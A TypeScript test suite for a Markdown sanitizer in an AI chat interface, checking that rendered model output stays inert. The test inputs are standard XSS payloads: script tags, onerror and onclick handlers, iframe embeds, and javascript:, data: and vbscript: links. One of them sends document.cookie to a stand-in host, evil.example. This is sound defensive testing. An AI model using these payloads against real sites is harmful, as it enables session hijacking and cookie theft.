/**
 * Tests for #755 — XSS mitigation in AI chat Markdown rendering.
 *
 * Standard XSS injection vectors delivered through Markdown the way a chat
 * drawer renders them: inline HTML in model output, event handlers, hostile
 * link schemes, and iframe/script embeds. Every render must be inert.
 */

import { describe, it, expect } from "vitest";
import { renderSafeMarkdown } from "./safeMarkdown";

describe("renderSafeMarkdown (#755)", () => {
  it("renders benign Markdown unchanged in structure", () => {
    const html = renderSafeMarkdown(
      "# Heading\n\nSome **bold** and _italic_ text.\n\n- item 1\n- item 2",
    );

    expect(html).toContain("<h1>Heading</h1>");
    expect(html).toContain("<strong>bold</strong>");
    expect(html).toContain("<li>item 1</li>");
  });

  it("renders code blocks without executing their content", () => {
    const html = renderSafeMarkdown("```\n<script>alert(1)</script>\n```");

    expect(html).toContain("<code");
    // The script text must be escaped, not executable markup.
    expect(html).not.toContain("<script>");
  });

  it("strips <script> tags injected through inline HTML", () => {
    const html = renderSafeMarkdown('Hello <script>alert("xss")</script> world');

    expect(html).not.toContain("<script");
    expect(html).not.toContain("alert");
  });

  it("strips <img onerror> payloads", () => {
    const html = renderSafeMarkdown('<img src=x onerror="alert(1)">');

    expect(html).not.toContain("onerror");
    expect(html).not.toContain("alert(1)");
  });

  it("strips <iframe>, <object> and <embed>", () => {
    const html = renderSafeMarkdown(
      '<iframe src="https://evil.example"></iframe><object data="x"></object><embed src="x">',
    );

    expect(html).not.toContain("<iframe");
    expect(html).not.toContain("<object");
    expect(html).not.toContain("<embed");
  });

  it("removes inline event handlers on surviving elements", () => {
    const html = renderSafeMarkdown('<span onclick="alert(1)">hi</span>');

    expect(html).not.toContain("onclick");
    expect(html).toContain("hi");
  });

  it("neutralizes javascript: link targets", () => {
    const html = renderSafeMarkdown("[click me](javascript:alert(1))");

    expect(html.toLowerCase()).not.toContain("javascript:");
  });

  it("neutralizes data: and vbscript: link targets", () => {
    const html = renderSafeMarkdown(
      "[a](data:text/html,<script>alert(1)</script>) [b](vbscript:msgbox)",
    );

    expect(html.toLowerCase()).not.toContain("data:text/html");
    expect(html.toLowerCase()).not.toContain("vbscript:");
  });

  it("forces target=_blank and rel=noopener noreferrer on external links", () => {
    const html = renderSafeMarkdown("[docs](https://example.com/docs)");

    expect(html).toContain('href="https://example.com/docs"');
    expect(html).toContain('target="_blank"');
    expect(html).toContain('rel="noopener noreferrer"');
  });

  it("keeps relative links safe and anchored", () => {
    const html = renderSafeMarkdown("[orders](/orders)");

    expect(html).toContain('href="/orders"');
    expect(html).toContain('target="_blank"');
    expect(html).toContain('rel="noopener noreferrer"');
  });

  it("renders tables (Markdown vocabulary) intact", () => {
    const html = renderSafeMarkdown("| a | b |\n| - | - |\n| 1 | 2 |");

    expect(html).toContain("<table>");
    expect(html).toContain("<td>1</td>");
  });

  it("returns empty string for empty and non-string input", () => {
    expect(renderSafeMarkdown("")).toBe("");
    expect(renderSafeMarkdown("   ")).toBe("");
    expect(renderSafeMarkdown(undefined as unknown as string)).toBe("");
  });

  it("is idempotent — rendering already-rendered output changes nothing", () => {
    const malicious = 'Hi <img src=x onerror="alert(1)"> [x](javascript:alert(2))';
    const once = renderSafeMarkdown(malicious);
    const twice = renderSafeMarkdown(once);

    expect(twice).toBe(once);
  });

  it("neutralizes a combined adversarial payload", () => {
    const payload = [
      "# Order update",
      "",
      '<img src=x onerror="fetch(\'https://evil.example?c=\'+document.cookie)">',
      "",
      "[click](javascript:alert(document.cookie))",
      "",
      "<iframe src=//evil.example></iframe>",
    ].join("\n");

    const html = renderSafeMarkdown(payload);

    expect(html).not.toContain("onerror");
    expect(html).not.toContain("javascript:");
    expect(html).not.toContain("<iframe");
    expect(html).not.toContain("document.cookie");
  });
});
